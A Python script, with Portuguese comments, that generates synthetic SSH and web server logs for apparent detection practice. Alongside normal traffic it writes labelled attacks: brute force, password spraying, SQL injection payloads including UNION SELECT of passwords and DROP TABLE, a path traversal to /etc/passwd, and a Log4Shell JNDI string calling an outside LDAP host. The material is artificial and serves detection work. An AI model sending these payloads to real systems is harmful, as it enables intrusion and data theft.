"""Gera logs sintéticos em samples/ com tráfego normal e alguns ataques.

Usa só IPs das faixas reservadas para documentação (RFC 5737: 192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24). Nada aqui vem de log real.
Seed fixa: rodar de novo produz exatamente os mesmos arquivos.
"""
import random
from datetime import datetime, timedelta
from pathlib import Path

rng = random.Random(42)
OUT = Path(__file__).resolve().parent.parent / "samples"
DAY = datetime(2026, 11, 7)

ssh_lines = []  # (datetime, texto)
web_lines = []


def ssh(ts, msg):
    pid = 2000 + rng.randint(0, 900)
    ssh_lines.append((ts, f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} srv01 sshd[{pid}]: {msg}"))


def web(ts, ip, method, path, status, size, ua, ref="-"):
    web_lines.append((ts, f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'))


def port():
    return rng.randint(32768, 60999)


BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
]

# ------------------------------------------------------------------ SSH
# Uso legítimo
for h, m in [(8, 12), (9, 40), (14, 5), (17, 51)]:
    ts = DAY + timedelta(hours=h, minutes=m)
    ssh(ts, f"Accepted publickey for maria from 192.0.2.10 port {port()} ssh2: RSA SHA256:Qk3x0aJ2")
ts = DAY + timedelta(hours=10, minutes=3)
ssh(ts, f"Failed password for joao from 10.0.0.5 port {port()} ssh2")  # errou a senha uma vez
ssh(ts + timedelta(seconds=9), f"Accepted password for joao from 10.0.0.5 port {port()} ssh2")

# 1) Força bruta clássica contra root/admin, sem sucesso (203.0.113.45)
start = DAY + timedelta(hours=3, minutes=12)
for i in range(58):
    user = rng.choice(["root", "root", "root", "admin", "ubuntu", "test", "oracle"])
    prefix = "invalid user " if user != "root" else ""
    ssh(start + timedelta(seconds=i * 8 + rng.randint(0, 3)), f"Failed password for {prefix}{user} from 203.0.113.45 port {port()} ssh2")

# 2) Password spraying: muitos usuários, poucas tentativas cada (198.51.100.23)
start = DAY + timedelta(hours=5, minutes=30)
users = ["maria", "joao", "ana", "carlos", "paula", "deploy", "backup", "git", "postgres", "jenkins", "www-data", "guest"]
for i, u in enumerate(users * 2):
    ssh(start + timedelta(seconds=i * 25), f"Failed password for {u} from 198.51.100.23 port {port()} ssh2")

# 3) Bateu no usuário 'deploy' depois de várias falhas (203.0.113.99): caso crítico
start = DAY + timedelta(hours=22, minutes=41)
for i in range(14):
    ssh(start + timedelta(seconds=i * 6), f"Failed password for deploy from 203.0.113.99 port {port()} ssh2")
ssh(start + timedelta(seconds=14 * 6 + 4), f"Accepted password for deploy from 203.0.113.99 port {port()} ssh2")

# Ruído de fundo: falhas isoladas de IPs diferentes (não devem gerar achado)
for ip in ["198.51.100.7", "203.0.113.150", "192.0.2.200"]:
    ssh(DAY + timedelta(hours=rng.randint(0, 23), minutes=rng.randint(0, 59)), f"Failed password for root from {ip} port {port()} ssh2")

# ------------------------------------------------------------------ Web
PAGES = ["/", "/produtos", "/produtos/42", "/sobre", "/contato", "/carrinho", "/css/app.css", "/js/app.js", "/img/logo.png"]
normal_ips = [f"192.0.2.{n}" for n in range(20, 50)]
for _ in range(320):
    ts = DAY + timedelta(seconds=rng.randint(6 * 3600, 23 * 3600))
    path = rng.choice(PAGES)
    web(ts, rng.choice(normal_ips), "GET", path, 200, rng.randint(400, 52000), rng.choice(BROWSERS), "https://www.google.com/")
for _ in range(6):  # alguns 404 legítimos (link quebrado)
    ts = DAY + timedelta(seconds=rng.randint(6 * 3600, 23 * 3600))
    web(ts, rng.choice(normal_ips), "GET", "/produtos/descontinuado", 404, 153, rng.choice(BROWSERS))

# 4) Enumeração de diretórios com wordlist (198.51.100.77, gobuster)
start = DAY + timedelta(hours=4, minutes=2)
words = ["admin", "backup", "config", "login", "test", "old", "dev", "uploads", "api", "private", "tmp", "db", "site", "wp-admin", "cgi-bin", "console", ".env", ".git/config", "phpmyadmin", "server-status"]
for i in range(130):
    w = words[i % len(words)] + ("" if i < len(words) else f"{i // len(words)}")
    web(start + timedelta(seconds=i * 1.2), "198.51.100.77", "GET", f"/{w}", 404, 153, "gobuster/3.6")

# 5) SQL injection com sqlmap (203.0.113.12)
start = DAY + timedelta(hours=6, minutes=15)
payloads = ["%27%20OR%201%3D1--", "1%20UNION%20SELECT%20username,password%20FROM%20users--", "1%3BSELECT%20SLEEP(5)--", "%27%3B%20DROP%20TABLE%20users%3B--"]
for i in range(24):
    web(start + timedelta(seconds=i * 3), "203.0.113.12", "GET", f"/produtos?id={payloads[i % len(payloads)]}", rng.choice([200, 500]), 900, "sqlmap/1.7.11#stable (https://sqlmap.org)")

# 6) Força bruta no login web (192.0.2.55)
start = DAY + timedelta(hours=13, minutes=20)
for i in range(32):
    web(start + timedelta(seconds=i * 4), "192.0.2.55", "POST", "/login", 401, 61, BROWSERS[2], "https://www.example.com/login")

# 7) Arquivo sensível exposto: .env respondendo 200 (203.0.113.200)
ts = DAY + timedelta(hours=7, minutes=48)
web(ts, "203.0.113.200", "GET", "/.env", 200, 412, "curl/8.4.0")
web(ts + timedelta(seconds=2), "203.0.113.200", "GET", "/.git/config", 404, 153, "curl/8.4.0")

# 8) Path traversal e Log4Shell (198.51.100.140)
ts = DAY + timedelta(hours=11, minutes=2)
web(ts, "198.51.100.140", "GET", "/download?file=../../../../etc/passwd", 400, 150, "python-requests/2.31.0")
web(ts + timedelta(seconds=1), "198.51.100.140", "GET", "/", 200, 5120, "${jndi:ldap://203.0.113.9/a}")

OUT.mkdir(exist_ok=True)
(OUT / "auth.log").write_text("\n".join(t for _, t in sorted(ssh_lines)) + "\n")
(OUT / "access.log").write_text("\n".join(t for _, t in sorted(web_lines)) + "\n")
print(f"auth.log: {len(ssh_lines)} linhas | access.log: {len(web_lines)} linhas")
